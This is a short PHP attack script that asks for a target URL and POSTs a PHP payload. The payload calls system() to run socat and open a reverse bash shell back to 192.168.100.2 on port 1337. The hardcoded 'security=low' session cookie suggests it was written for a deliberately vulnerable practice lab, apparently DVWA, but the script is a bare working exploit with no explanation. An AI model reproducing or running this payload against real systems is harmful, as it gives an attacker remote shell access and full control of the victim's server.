<?php 
function curl($url, $data){
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: PHPSESSID=cevfi0hsv9ikergihm3rh3t742; security=low"));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    $output = curl_exec($ch); 
    curl_close($ch);      
    print_r($output);
}

$url = readline("Target => ");
$data = '<?php echo system("socat tcp-connect:192.168.100.2:1337 exec:bash,pty,stderr,setsid,sigint"); ?>';
$send = curl($url,$data);
?>